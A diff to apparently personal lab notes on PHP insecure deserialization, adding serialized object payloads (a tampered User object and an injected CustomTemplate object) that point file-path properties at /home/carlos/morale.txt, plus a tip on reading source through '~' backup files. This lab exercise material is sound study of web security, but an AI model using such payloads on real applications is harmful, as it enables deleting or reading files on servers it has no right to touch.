@@ -33,3 +33,13 @@ Change to
 ```
 O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"z3lfeay545c0nkb2d6x1y84gjvbe5iii";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
 ```
+
+# Injecting arbitrary objects
+Note: We can see the code of the file if we put at the end this character "~", because somtehing save a backup with the same name with "~" at the end
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fvldisg9i5tcgj967j0b8074ocuzhnwh";}
+```
+```
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+
